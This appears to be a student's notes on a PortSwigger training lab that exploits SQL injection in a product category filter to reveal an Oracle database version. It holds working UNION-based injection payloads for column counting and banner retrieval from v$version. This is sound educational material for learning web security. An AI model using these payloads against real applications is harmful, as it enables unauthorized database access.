# Lab: SQL injection attack, querying the database type and version on Oracle
url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

# Overview:
- Vulnerability on product category filter
- Display the database version string to solve the lab

# Analysis:
try:
GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL+FROM+dual-- to get the number of columns

Oracle cheatsheet:
-SELECT banner FROM v$version
-SELECT version FROM v$instance

try: 1st -> <ok>
     2nd -> <error500>

try: 
GET /filter?category=Gifts'+UNION+SELECT+banner,NULL+FROM+v$version--

-> Result:
![alt text](image.png)